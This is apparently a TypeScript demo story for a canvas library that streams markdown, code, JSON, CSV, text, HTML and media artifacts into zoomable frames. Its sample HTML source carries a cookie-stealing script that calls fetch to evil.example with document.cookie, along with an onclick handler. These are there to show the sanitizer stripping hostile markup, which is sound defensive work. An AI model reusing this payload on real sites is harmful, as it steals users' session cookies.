import {
  codeSegmenter,
  jsonSegmenter,
  markdownSegmenter,
  rowsSegmenter,
  textSegmenter,
  completeJsonPrefix,
} from "@dopejs/canvas-artifact";
import {
  createCamera,
  createSegmentedPort,
  panCamera,
  screenToWorld,
  SceneStore,
  StreamCoalescer,
  StreamingIngestion,
  VisibilityTracker,
  worldToScreen,
  zoomCameraAt,
  type ArtifactHandle,
  type Camera,
  type SegmentedPort,
} from "@dopejs/canvas-core";
import type { ArtifactFrame, ArtifactKind, StreamSegmenter } from "@dopejs/canvas-protocol";
import { MediaIngestion } from "@dopejs/canvas-core";
import { htmlSegmenter, sanitizeHtml } from "@dopejs/canvas-security";
import {
  compileCode,
  compileHtmlProfile,
  compileJson,
  compileMarkdown,
  compileRows,
  compileText,
  compileError,
  compileLoading,
  compileMedia,
  layoutBlocks,
  type Block,
  type DisplayList,
  type TextStyle,
} from "@dopejs/canvas-renderer";
import { createHiDpiCanvas } from "./hidpi.js";

export default {
  title: "Canvas Stream",
};

interface KindSpec {
  readonly kind: ArtifactKind;
  readonly segmenter: StreamSegmenter;
  readonly hue: number;
  /** Turn the committed prefix into the source the frame will render. */
  readonly render: (committed: string, complete: boolean) => string;
  /** Compile that source into display-list blocks for canvas-native drawing. */
  readonly compile: (rendered: string) => Block[];
}

/**
 * Each kind carries its own rule for when received characters stop being
 * provisional, and its own way of turning the committed prefix into something
 * displayable. The canvas drives them all through one ingestion engine.
 */
const KINDS: readonly KindSpec[] = [
  {
    kind: "markdown",
    segmenter: markdownSegmenter,
    hue: 210,
    render: (text) => text,
    compile: (text) => compileMarkdown(text),
  },
  {
    kind: "code",
    segmenter: codeSegmenter,
    hue: 275,
    render: (text) => text,
    compile: (text) => compileCode(text),
  },
  {
    kind: "json",
    segmenter: jsonSegmenter,
    // Closing the open structures keeps partial output parseable, so the frame
    // shows real formatted, highlighted data instead of a truncated blob.
    render: (text) => (text ? completeJsonPrefix(text) : ""),
    compile: (text) => compileJson(text),
    hue: 150,
  },
  {
    kind: "rows",
    segmenter: rowsSegmenter,
    hue: 30,
    render: (text) => text,
    compile: (text) => compileRows(text),
  },
  {
    kind: "text",
    segmenter: textSegmenter,
    hue: 340,
    render: (text) => text,
    compile: (text) => compileText(text),
  },
  {
    kind: "html",
    segmenter: htmlSegmenter,
    // The sanitized profile compiles to the same display list as everything
    // else, so HTML renders as headings, emphasis, and tables rather than as
    // markup. Rasterizing arbitrary HTML remains the M0 browser question.
    render: (text) => {
      const result = sanitizeHtml(text);
      return result.ok ? result.html : "";
    },
    compile: (html) => compileHtmlProfile(html),
    hue: 95,
  },
];

/** Kinds that have no partial form: they load, then resolve or fail. */
const MEDIA_KINDS = [
  { kind: "image" as const, hue: 190, metadata: { width: 1200, height: 800 }, bytes: 420_000 },
  {
    kind: "video" as const,
    hue: 255,
    metadata: { width: 1920, height: 1080, durationMs: 12_500 },
    bytes: 2_400_000,
  },
];

const SOURCES: Record<Exclude<ArtifactKind, "image" | "video">, string> = {
  markdown:
    "## Q3 summary\n\nRevenue reached **$4.2M**, up 12% quarter over quarter.\n\n" +
    "Drivers:\n- Enterprise renewals\n- Self-serve conversion\n\n" +
    "See the [full breakdown](https://example.com/q3) for segment detail.\n",
  code:
    "export function growth(prev: number, next: number): number {\n" +
    "  if (prev === 0) throw new RangeError('no baseline');\n" +
    "  return (next - prev) / prev;\n" +
    "}\n",
  json:
    '{"quarter":"Q3","rows":[{"segment":"Enterprise","growth":0.18},' +
    '{"segment":"Self-serve","growth":0.07},{"segment":"Partners","growth":0.04}],"total":4200000}',
  rows:
    "segment,revenue,growth\nEnterprise,2400000,18%\nSelf-serve,1100000,7%\n" +
    "Partners,700000,4%\nTotal,4200000,12%\n",
  text:
    "The quarter closed ahead of plan. Enterprise renewals carried most of the " +
    "growth, while self-serve conversion improved after the onboarding change. 📈\n",
  html:
    '<section class="card"><h3>Q3 revenue</h3><p>Up <strong>12%</strong> QoQ.</p>' +
    '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
    '<p onclick="alert(1)">Appendix follows.</p></section>',
};

type NodeStatus = "loading" | "content" | "failed";

interface MediaState {
  readonly ingestion: MediaIngestion;
  loaded: number;
  readonly total: number;
  /** One artifact fails on purpose so the error state is always on screen. */
  readonly failAt: number | null;
}

interface StreamingNode {
  readonly id: string;
  readonly spec: KindSpec;
  readonly frame: ArtifactFrame;
  readonly handle: ArtifactHandle;
  readonly port: SegmentedPort | null;
  readonly ingestion: StreamingIngestion | null;
  readonly chunks: readonly string[];
  cursor: number;
  media: MediaState | null;
  metadata: { width: number; height: number; durationMs?: number } | null;
  display: string;
  /** Layout is content geometry, so it is recomputed only when content changes. */
  layout: DisplayList | null;
  done: boolean;
}

function tokenize(text: string, seed: number): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 2 + (seed % 4);
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 9) + 2;
  }
  return chunks;
}

/**
 * Artifacts stream onto the canvas itself. The agent announces a new frame
 * every few ticks — the scene grows while its contents are still arriving —
 * and each frame fills in under its own kind's stability rule. Drag to pan,
 * scroll to pan, pinch or ⌘/Ctrl+scroll to zoom while generation continues.
 */
export const Streaming_Nodes = (): HTMLElement => {
  const root = document.createElement("div");
  root.style.cssText = "font: 12px system-ui; position: relative;";

  const { canvas, context, cssWidth, cssHeight, clear } = createHiDpiCanvas(960, 620);
  canvas.style.cssText += "border: 1px solid #ccc; border-radius: 6px; cursor: grab;";

  const controls = document.createElement("div");
  controls.style.cssText = "display: flex; gap: 8px; align-items: center; margin-bottom: 8px;";
  const playButton = document.createElement("button");
  playButton.textContent = "Generate";
  const resetButton = document.createElement("button");
  resetButton.textContent = "Reset";
  const speed = document.createElement("input");
  speed.type = "range";
  speed.min = "16";
  speed.max = "220";
  speed.value = "70";
  speed.style.width = "140px";
  const speedLabel = document.createElement("span");
  speedLabel.style.color = "#555";
  speedLabel.textContent = "70ms / token";
  controls.append(playButton, resetButton, speed, speedLabel);

  const hud = document.createElement("div");
  hud.style.cssText =
    "position: absolute; top: 38px; left: 8px; background: rgba(255,255,255,.92); " +
    "padding: 6px 10px; border-radius: 6px; box-shadow: 0 1px 4px rgba(0,0,0,.2); white-space: pre;";
  root.append(controls, canvas, hud);

  let store: SceneStore;
  let tracker: VisibilityTracker;
  let nodes: StreamingNode[] = [];
  let camera: Camera;
  let clock = 0;
  let announced = 0;
  let timer: number | null = null;

  const TOTAL_NODES = KINDS.length + MEDIA_KINDS.length;

  const frameFor = (index: number): ArtifactFrame => ({
    x: -420 + (index % 3) * 300,
    y: -300 + Math.floor(index / 3) * 280,
    width: 260,
    height: 230,
    zIndex: index,
  });

  const announce = (): void => {
    const index = announced;
    const frame = frameFor(index);

    if (index >= KINDS.length) {
      // Atomic media: nothing to segment, so it loads and then resolves or fails.
      const media = MEDIA_KINDS[index - KINDS.length] as (typeof MEDIA_KINDS)[number];
      const id = `${media.kind}-${index}`;
      const handle = store.transact((tx) => tx.createArtifact(id, frame));
      nodes.push({
        id,
        spec: {
          kind: media.kind,
          hue: media.hue,
          segmenter: () => ({ committedLength: 0, pending: null }),
          render: () => "",
          compile: () => [],
        },
        frame,
        handle,
        port: null,
        ingestion: null,
        chunks: [],
        cursor: 0,
        media: {
          ingestion: new MediaIngestion(store, handle, media.kind),
          loaded: 0,
          total: media.bytes,
          // The video fails on purpose: an error state nobody can see is an
          // error state nobody has checked.
          failAt: media.kind === "video" ? Math.floor(media.bytes * 0.6) : null,
        },
        metadata: media.metadata,
        display: "",
        layout: null,
        done: false,
      });
      announced += 1;
      return;
    }

    const spec = KINDS[index] as KindSpec;
    const id = `${spec.kind}-${index}`;
    const handle = store.transact((tx) => tx.createArtifact(id, frame));
    const port = createSegmentedPort({
      segmenter: spec.segmenter,
      render: spec.render,
      maxChars: 4096,
    });
    nodes.push({
      id,
      spec,
      frame,
      handle,
      port,
      ingestion: new StreamingIngestion(
        store,
        handle,
        port,
        new StreamCoalescer({ minIntervalMs: 0, minChars: 1 }),
      ),
      chunks: tokenize(SOURCES[spec.kind as keyof typeof SOURCES], index),
      cursor: 0,
      media: null,
      metadata: null,
      display: "",
      layout: null,
      done: false,
    });
    announced += 1;
  };

  const advanceMedia = (node: StreamingNode, media: MediaState): boolean => {
    // Media has no partial content, so what advances is the transfer, not the
    // artifact: the frame stays in loading until it resolves or fails.
    media.loaded = Math.min(media.total, media.loaded + Math.ceil(media.total / 24));
    media.ingestion.report(media.loaded, media.total);
    node.layout = null;

    if (media.failAt !== null && media.loaded >= media.failAt) {
      media.ingestion.fail("decode-failed", "the stream ended before the media could decode");
      node.done = true;
      return true;
    }
    if (media.loaded >= media.total) {
      media.ingestion.resolve(node.metadata ?? { width: 1, height: 1 });
      node.done = true;
    }
    return true;
  };

  const tick = (): boolean => {
    clock += 16;
    if (announced < TOTAL_NODES && clock % 96 === 0) announce();

    let active = false;
    for (const node of nodes) {
      if (node.done) continue;

      if (node.media) {
        active = advanceMedia(node, node.media) || active;
        continue;
      }

      const ingestion = node.ingestion;
      if (!ingestion) continue;
      if (node.cursor >= node.chunks.length) {
        node.display = ingestion.finish().html;
        node.layout = null;
        node.done = true;
        continue;
      }
      const result = ingestion.push(node.chunks[node.cursor] as string, clock);
      node.cursor += 1;
      if (result.rendered && result.html !== node.display) {
        node.display = result.html;
        node.layout = null;
      }
      if (result.status === "rejected") node.done = true;
      active = true;
    }
    draw();
    return active || announced < TOTAL_NODES;
  };

  const fontOf = (style: TextStyle): string =>
    `${style.italic ? "italic " : ""}${style.weight} ${style.size}px ` +
    (style.family === "mono" ? "ui-monospace, SFMono-Regular, monospace" : "system-ui, sans-serif");

  const measure = (text: string, style: TextStyle): number => {
    context.font = fontOf(style);
    return context.measureText(text).width;
  };

  const FRAME_PADDING = 10;

  const statusOf = (node: StreamingNode): NodeStatus => {
    const record = store.getById(node.id);
    if (record?.lifecycle === "failed") return "failed";
    if (record?.lifecycle === "loading") return "loading";
    return "content";
  };

  /**
   * Layout depends on content and frame width only — never on zoom. Which
   * blocks get laid out depends on the artifact's state: every kind has a
   * loading and an error presentation, not just a content one.
   */
  const layoutOf = (node: StreamingNode): DisplayList => {
    if (node.layout) return node.layout;
    const record = store.getById(node.id);
    const status = statusOf(node);

    let blocks;
    if (status === "failed") {
      blocks = compileError({
        code: record?.failure?.code ?? "unknown",
        message: record?.failure?.message ?? "the artifact failed",
        recoverable: record?.failure?.recoverable ?? true,
      });
    } else if (status === "loading") {
      blocks = compileLoading({
        kind: node.spec.kind,
        progress: node.media ? node.media.loaded / node.media.total : null,
      });
    } else if (node.media && node.metadata) {
      blocks = compileMedia(node.spec.kind as "image" | "video", node.metadata);
    } else {
      blocks = node.spec.compile(node.display);
    }

    node.layout = layoutBlocks(blocks, {
      width: node.frame.width - FRAME_PADDING * 2,
      measure,
      maxMediaHeight: node.frame.height - 70,
    });
    return node.layout;
  };

  const draw = (): void => {
    const start = performance.now();
    clear();
    const sets = tracker.compute(store, camera);
    const visible = new Set(sets.visible);

    let streaming = 0;
    let loading = 0;
    let failed = 0;
    for (const node of nodes) {
      const record = store.getById(node.id);
      if (!record) continue;
      if (record.lifecycle === "streaming") streaming += 1;
      if (record.lifecycle === "loading") loading += 1;
      if (record.lifecycle === "failed") failed += 1;
      if (!visible.has(node.id)) continue;

      const topLeft = worldToScreen(camera, { x: node.frame.x, y: node.frame.y });
      const width = node.frame.width * camera.zoom;
      const height = node.frame.height * camera.zoom;
      const isStreaming = record.lifecycle === "streaming" || record.lifecycle === "loading";
      const hasFailed = record.lifecycle === "failed";

      // One rounded path is the frame's clip for everything drawn inside it, so
      // the badge band and the progress bar follow the corners instead of
      // squaring them off.
      const radius = 8 * Math.min(camera.zoom, 1);
      const frame = new Path2D();
      frame.roundRect(topLeft.x, topLeft.y, width, height, radius);
      const badgeHeight = 22 * camera.zoom;
      const progressHeight = 3 * Math.min(camera.zoom, 1.5);

      context.fillStyle = "#fff";
      context.fill(frame);

      context.save();
      context.clip(frame);

      context.fillStyle = hasFailed ? "#fbe9e7" : `hsl(${node.spec.hue} 60% 92%)`;
      context.fillRect(topLeft.x, topLeft.y, width, badgeHeight);
      context.fillStyle = hasFailed ? "#8c1d18" : `hsl(${node.spec.hue} 60% 28%)`;
      context.font = `${11 * Math.min(camera.zoom, 1.2)}px ui-monospace, monospace`;
      context.fillText(node.spec.kind, topLeft.x + 8, topLeft.y + 15 * camera.zoom);

      const received = node.media ? node.media.loaded : (node.port?.buffer.length ?? 0);
      const total = node.media
        ? node.media.total
        : SOURCES[node.spec.kind as keyof typeof SOURCES].length;
      context.fillStyle = `hsl(${node.spec.hue} 70% 55%)`;
      context.fillRect(
        topLeft.x,
        topLeft.y + height - progressHeight,
        (width * received) / total,
        progressHeight,
      );

      if (camera.zoom > 0.3) {
        // Content is laid out once in artifact space; zoom is only a transform,
        // which is what keeps camera movement from rebuilding content.
        const list = layoutOf(node);
        context.save();
        context.beginPath();
        context.rect(
          topLeft.x,
          topLeft.y + badgeHeight,
          width,
          height - badgeHeight - progressHeight,
        );
        context.clip();
        context.translate(topLeft.x + FRAME_PADDING * camera.zoom, topLeft.y + 26 * camera.zoom);
        context.scale(camera.zoom, camera.zoom);

        for (const rect of list.rects) {
          context.fillStyle = rect.fill;
          context.beginPath();
          context.roundRect(rect.x, rect.y, rect.width, rect.height, rect.radius ?? 0);
          context.fill();
        }
        for (const rule of list.rules) {
          context.fillStyle = rule.color;
          context.fillRect(rule.x, rule.y, rule.width, 1);
        }
        for (const run of list.runs) {
          context.font = fontOf(run.style);
          context.fillStyle = run.style.color;
          context.fillText(run.text, run.x, run.y, run.maxWidth);
          if (run.style.underline === true) {
            const width_ = Math.min(context.measureText(run.text).width, run.maxWidth);
            context.fillRect(run.x, run.y + 2, width_, 0.8);
          }
        }

        // The withheld tail, drawn as a caret that never resolves on screen.
        // Media has no tail: it is atomic, so there is nothing to withhold.
        if (isStreaming && node.port?.pending != null) {
          const last = list.runs[list.runs.length - 1];
          context.fillStyle = `hsl(${node.spec.hue} 80% 45%)`;
          if (last) {
            context.font = fontOf(last.style);
            context.fillRect(
              last.x + context.measureText(last.text).width + 1,
              last.y - last.style.size,
              4,
              last.style.size + 2,
            );
          }
        }
        context.restore();
      }

      context.restore(); // release the rounded clip

      // Stroke the border last so it stays crisp over the fills it bounds.
      context.strokeStyle = hasFailed
        ? "#b3261e"
        : isStreaming
          ? `hsl(${node.spec.hue} 70% 55%)`
          : `hsl(${node.spec.hue} 30% 72%)`;
      context.lineWidth = isStreaming || hasFailed ? 2 : 1;
      if (isStreaming) context.setLineDash([6, 4]);
      context.stroke(frame);
      context.setLineDash([]);
    }

    const withheld = nodes.reduce(
      (sum, node) => sum + ((node.port?.buffer.length ?? 0) - (node.port?.committedLength ?? 0)),
      0,
    );
    const pendingReasons = [...new Set(nodes.map((node) => node.port?.pending).filter(Boolean))];
    hud.textContent =
      `nodes ${nodes.length}   loading ${loading}   streaming ${streaming}   failed ${failed}` +
      `   visible ${sets.visible.length}\n` +
      `withheld ${withheld} chars   reasons ${pendingReasons.join(", ") || "—"}\n` +
      `zoom ${camera.zoom.toFixed(2)}   draw ${(performance.now() - start).toFixed(2)} ms`;
  };

  const stop = (): void => {
    if (timer !== null) {
      clearInterval(timer);
      timer = null;
    }
    playButton.textContent = "Generate";
  };

  const reset = (): void => {
    stop();
    store = new SceneStore();
    tracker = new VisibilityTracker();
    nodes = [];
    announced = 0;
    clock = 0;
    camera = createCamera({
      x: 0,
      y: 0,
      zoom: 0.9,
      viewportWidth: cssWidth,
      viewportHeight: cssHeight,
    });
    announce();
    draw();
  };

  playButton.addEventListener("click", () => {
    if (timer !== null) {
      stop();
      return;
    }
    playButton.textContent = "Pause";
    timer = window.setInterval(() => {
      if (!tick()) stop();
    }, Number(speed.value));
  });
  resetButton.addEventListener("click", reset);
  speed.addEventListener("input", () => {
    speedLabel.textContent = `${speed.value}ms / token`;
    if (timer !== null) {
      stop();
      playButton.click();
    }
  });

  let dragging = false;
  let lastX = 0;
  let lastY = 0;
  canvas.addEventListener("pointerdown", (event) => {
    dragging = true;
    lastX = event.offsetX;
    lastY = event.offsetY;
    canvas.setPointerCapture(event.pointerId);
    canvas.style.cursor = "grabbing";
  });
  canvas.addEventListener("pointermove", (event) => {
    if (!dragging) return;
    camera = panCamera(camera, -(event.offsetX - lastX), -(event.offsetY - lastY));
    lastX = event.offsetX;
    lastY = event.offsetY;
    draw();
  });
  canvas.addEventListener("pointerup", () => {
    dragging = false;
    canvas.style.cursor = "grab";
  });
  canvas.addEventListener(
    "wheel",
    (event) => {
      event.preventDefault();
      if (event.ctrlKey || event.metaKey) {
        const factor = Math.exp(-Math.max(-64, Math.min(64, event.deltaY)) * 0.01);
        camera = zoomCameraAt(camera, { x: event.offsetX, y: event.offsetY }, factor);
      } else {
        camera = panCamera(camera, event.deltaX, event.deltaY);
      }
      draw();
    },
    { passive: false },
  );
  canvas.addEventListener("dblclick", (event) => {
    // Double click reports which artifact sits under the cursor, proving the
    // spatial index tracks frames that are still being generated.
    const world = screenToWorld(camera, { x: event.offsetX, y: event.offsetY });
    const hit = store.queryPoint(world.x, world.y)[0];
    if (hit) hud.textContent = `${hud.textContent}\nhit ${hit}`;
  });

  reset();
  return root;
};
